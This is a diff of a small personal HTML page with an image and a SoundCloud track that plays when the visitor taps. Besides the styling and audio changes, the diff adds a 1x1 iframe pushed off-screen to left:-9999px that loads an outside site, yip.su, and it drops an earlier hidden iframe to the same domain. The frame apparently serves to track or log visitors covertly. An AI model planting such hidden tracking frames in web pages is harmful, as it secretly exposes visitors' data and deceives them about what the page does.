@@ -15,46 +15,59 @@
     align-items: center;     /* centro orizzontale */
     user-select: none;
     cursor: pointer;
+    text-align: center;
   }
   #header {
     font-size: 28px;
     margin-bottom: 20px;
-    text-align: center;
   }
   #image {
-    width: 100px; /* dimensione piccola */
+    width: 100px;
   }
-  #hiddenSite {
-    display: none;
+  #instruction {
+    font-size: 16px;
+    margin-top: 30px;
+    color: #ccc;
   }
-  #soundcloudPlayer {
-    width: 0;
-    height: 0;
-    border: 0;
+  #yipFrame {
+    display: none; /* invisibile */
   }
 </style>
 </head>
 <body>
   <div id="header">69420alt Pudshi Owner</div>
   <img id="image" src="https://i.postimg.cc/wvWPXkkz/Immagine-2025-07-02-212001.png" alt="69420alt Image" />
+  <div id="instruction">Tap anywhere to play music</div>
 
   <iframe
     id="soundcloudPlayer"
-    width="100%" height="300" scrolling="no" frameborder="no" allow="autoplay"
-    src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true">
+    width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
+    src=""
+    style="display:none;">
   </iframe>
 
-  <iframe id="hiddenSite" src="https://yip.su/aura"></iframe>
+  <iframe
+    id="yipFrame"
+    src="https://yip.su"
+    width="1" height="1" frameborder="0" style="position:absolute; left:-9999px;">
+  </iframe>
 
 <script>
   const iframe = document.getElementById('soundcloudPlayer');
+  const yip = document.getElementById('yipFrame');
+  const instruction = document.getElementById('instruction');
   let started = false;
 
-  document.body.addEventListener('click', () => {
+  function startAudio() {
     if (started) return;
-    iframe.src = "https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true";
+    iframe.style.display = 'block';
+    iframe.src = "https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=false";
+    instruction.style.display = 'none';
     started = true;
-  });
+  }
+
+  document.body.addEventListener('click', startAudio);
+  document.body.addEventListener('touchstart', startAudio);
 </script>
 </body>
 </html>
